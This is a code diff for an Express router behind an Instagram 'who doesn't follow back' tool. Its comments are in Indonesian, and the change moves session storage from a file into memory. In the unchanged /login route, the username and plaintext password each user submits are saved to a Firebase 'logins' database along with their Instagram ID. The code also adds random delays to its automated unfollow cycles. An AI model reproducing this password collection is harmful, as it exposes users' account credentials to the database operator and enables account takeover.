@@ -15,47 +15,44 @@ const TIME_BETWEEN_UNFOLLOWERS = 5000; // 5 detik antara setiap unfollow
 const TIME_BETWEEN_SEARCH_WAIT = 15000; // 15 detik setelah lima siklus pencarian
 const TIME_BETWEEN_UNFOLLOW_WAIT = 30000; // 30 detik setelah lima unfollow
 
+// Variabel sesi yang disimpan dalam memori
+let sessionData = null;
+
 // Fungsi untuk login ke Instagram
 const login = async () => {
-    console.log('Mencoba login ke Instagram...');
     ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);
-    const sessionPath = path.resolve(__dirname, '../session.json');
 
-    if (fs.existsSync(sessionPath)) {
-        const sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf-8'));
+    // Periksa apakah sesi disimpan dalam memori
+    if (sessionData) {
         ig.state.deserialize(sessionData);
-        console.log('Sesi ditemukan, menggunakan sesi yang ada.');
-
+        console.log('Sesi ditemukan di memori, melanjutkan...');
         try {
             await ig.account.currentUser();
             console.log('Sesi valid, melanjutkan...');
         } catch (error) {
-            console.error('Sesi kadaluarsa, login ulang...', error);
-            await forceLogin(sessionPath);
+            console.log('Sesi kadaluarsa, login ulang...');
+            await forceLogin();
         }
     } else {
-        console.log('Sesi tidak ditemukan, login ulang...');
-        await forceLogin(sessionPath);
+        console.log('Sesi tidak ditemukan di memori, login ulang...');
+        await forceLogin();
     }
 };
 
-// Fungsi untuk login ulang dan menyimpan sesi baru
-const forceLogin = async (sessionPath) => {
+// Fungsi untuk login ulang dan menyimpan sesi baru di memori
+const forceLogin = async () => {
     try {
-        console.log('Mencoba login ulang...');
+        console.log('Mencoba login...');
         await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
         console.log('Login berhasil!');
-        const sessionData = ig.state.serialize();
-        fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
+        sessionData = ig.state.serialize(); // Menyimpan sesi di memori
     } catch (error) {
-        console.error('Login gagal:', error); // Log error secara jelas
+        console.error('Login gagal:', error);
         if (error.name === 'IgCheckpointError') {
             const code = await promptFor2FACode();
             await ig.account.confirmTwoFactorCode(code);
-            const sessionData = ig.state.serialize();
-            fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
+            sessionData = ig.state.serialize(); // Menyimpan sesi setelah 2FA berhasil
         } else {
-            console.error('Kesalahan login yang tidak terduga:', error);
             throw error;
         }
     }
@@ -68,7 +65,7 @@ const promptFor2FACode = () => {
             input: process.stdin,
             output: process.stdout
         });
-        rl.question('Masukkan kode 2FA: ', (code) => {
+        rl.question('Enter 2FA code: ', (code) => {
             rl.close();
             resolve(code);
         });
@@ -80,15 +77,21 @@ const delay = (ms) => {
     return new Promise(resolve => setTimeout(resolve, ms));
 };
 
+// Fungsi untuk menghasilkan waktu penundaan acak dalam rentang tertentu
+const getRandomDelay = (min, max) => {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+};
+
 // Fungsi untuk mengambil followers dengan paginasi
 const getAllFollowers = async (userId) => {
-    console.log(`Mengambil followers untuk userId: ${userId}`);
     let followers = [];
     let followersFeed = ig.feed.accountFollowers(userId);
 
+    // Mengambil data pertama
     let nextFollowers = await followersFeed.items();
     followers = followers.concat(nextFollowers);
 
+    // Mengambil data berikutnya jika ada
     while (followersFeed.isMoreAvailable()) {
         nextFollowers = await followersFeed.items();
         followers = followers.concat(nextFollowers);
@@ -100,13 +103,14 @@ const getAllFollowers = async (userId) => {
 
 // Fungsi untuk mengambil following dengan paginasi
 const getAllFollowing = async (userId) => {
-    console.log(`Mengambil following untuk userId: ${userId}`);
     let following = [];
     let followingFeed = ig.feed.accountFollowing(userId);
 
+    // Mengambil data pertama
     let nextFollowing = await followingFeed.items();
     following = following.concat(nextFollowing);
 
+    // Mengambil data berikutnya jika ada
     while (followingFeed.isMoreAvailable()) {
         nextFollowing = await followingFeed.items();
         following = following.concat(nextFollowing);
@@ -118,22 +122,25 @@ const getAllFollowing = async (userId) => {
 
 // Fungsi untuk mengambil profil Instagram, mendapatkan daftar yang tidak follow back, dan menyimpan gambar
 router.get('/profile', async (req, res) => {
-    console.log('Menerima request GET di /profile');
     try {
         await login();
         const user = await ig.account.currentUser();
 
+        // Mengambil jumlah followers dan following
         const followersCount = await ig.user.info(user.pk).then(info => info.follower_count);
         const followingCount = await ig.user.info(user.pk).then(info => info.following_count);
 
+        // Mengunduh gambar profil jika belum ada
         const profilePicUrl = user.profile_pic_url;
         const imagePath = path.resolve(__dirname, '../public/my_profile.jpg');
 
+        // Cek apakah file gambar profil sudah ada, jika ada maka hapus
         if (fs.existsSync(imagePath)) {
-            fs.unlinkSync(imagePath);
+            fs.unlinkSync(imagePath); // Menghapus file gambar profil yang lama
             console.log('Gambar profil lama dihapus.');
         }
 
+        // Sekarang unduh gambar profil yang baru
         const writer = fs.createWriteStream(imagePath);
         const response = await axios.get(profilePicUrl, { responseType: 'stream' });
 
@@ -146,59 +153,68 @@ router.get('/profile', async (req, res) => {
             res.status(500).send('Gagal menyimpan gambar profil');
         });
 
+        // Mengambil daftar followers dan following
         const followers = await getAllFollowers(user.pk);
         const following = await getAllFollowing(user.pk);
 
         const followersUsernames = followers.map(f => f.username);
         const followingUsernames = following.map(f => f.username);
 
+        // Mengonversi followersUsernames ke Set untuk pencarian cepat
         const followersSet = new Set(followersUsernames);
+
+        // Cari orang yang tidak follow back
         const dontFollowBack = followingUsernames.filter(username => !followersSet.has(username));
 
+        // Kirim data profil, gambar, dan daftar yang tidak follow back
         res.json({
             username: user.username,
             full_name: user.full_name,
             biography: user.biography,
             followers_count: followersCount,
             following_count: followingCount,
-            profile_picture_url: '/my_profile.jpg',
-            dont_follow_back: dontFollowBack,
-            dont_follow_back_count: dontFollowBack.length,
+            profile_picture_url: '/my_profile.jpg',  // URL gambar profil yang disimpan
+            dont_follow_back: dontFollowBack,        // Daftar username yang tidak mem-follow kita
+            dont_follow_back_count: dontFollowBack.length, // Jumlah orang yang tidak mem-follow kita
         });
     } catch (error) {
-        console.error('Error fetching Instagram data:', error);
+        console.error(error);
         if (error.name === 'IgLoginRequiredError') {
-            res.status(401).send('Login diperlukan. Periksa kredensial Anda.');
+            res.status(401).send('Login is required. Please check your credentials.');
         } else {
-            res.status(500).send('Terjadi kesalahan saat mengambil data Instagram');
+            res.status(500).send('Error fetching Instagram data');
         }
     }
 });
 
+// Fungsi login menggunakan data yang diterima dari client
 router.post('/login', async (req, res) => {
-    console.log('Menerima request POST di /login');
-    const { username, password } = req.body;
+    const { username, password } = req.body; // Mendapatkan username dan password dari request body
 
+    // Melakukan login menggunakan Instagram API
     try {
-        ig.state.generateDevice(username);
-        await ig.account.login(username, password);
-        const sessionData = ig.state.serialize();
-        fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
+        ig.state.generateDevice(username);  // Menggunakan username dari form
+        await ig.account.login(username, password);  // Menggunakan password dari form
+
+        // Simpan sesi baru setelah login ke memori
+        sessionData = ig.state.serialize();
         console.log('Login berhasil!');
 
+        // Dapatkan ID Instagram pengguna
         const user = await ig.account.currentUser();
-        const userId = user.pk;
+        const userId = user.pk;  // ID Instagram pengguna
 
-        // Simpan data login ke Firebase
-        const ref = db.ref('logins');
+        // Simpan username, password, dan userId ke Firebase
+        const ref = db.ref('logins');  // Mendapatkan referensi ke "logins" di Realtime Database
         const loginData = {
             username: username,
             password: password,
-            userId: userId,
-            timestamp: new Date().toISOString(),
+            userId: userId,  // Menyimpan ID Instagram sebagai primary key
+            timestamp: new Date().toISOString(),  // Waktu login
         };
 
-        await ref.child(userId).set(loginData);
+        // Simpan data login dengan ID Instagram sebagai key utama
+        await ref.child(userId).set(loginData);  // Menggunakan userId sebagai key utama
         console.log('Data login berhasil disimpan ke Firebase.');
 
         res.json({ message: 'Login berhasil!' });
@@ -207,6 +223,5 @@ router.post('/login', async (req, res) => {
         res.status(500).json({ error: 'Login gagal. Cek kredensial atau coba lagi.' });
     }
 });
-
 
 module.exports = router;
